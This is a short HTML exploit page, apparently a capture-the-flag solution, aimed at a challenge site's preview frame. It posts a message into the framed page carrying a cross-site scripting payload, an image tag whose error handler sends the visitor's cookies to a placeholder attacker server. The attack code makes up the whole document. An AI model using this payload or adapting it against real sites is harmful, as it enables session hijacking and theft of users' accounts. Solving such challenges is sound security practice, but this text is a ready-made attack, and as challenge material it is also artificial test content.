<!DOCTYPE html>
<html>
<body>
<iframe id="preview"
  src="https://CHALLENGE-INSTANCE/preview"
  style="width:100%;height:500px">
</iframe>

<script>
const f = document.getElementById('preview');

f.addEventListener('load', () => {
  f.contentWindow.postMessage({
    html: `<img src=x onerror="
      fetch('https://ATTACKER-SERVER?cookie=' + encodeURIComponent(document.cookie))
    ">`
  }, '*');
});
</script>
</body>
</html>
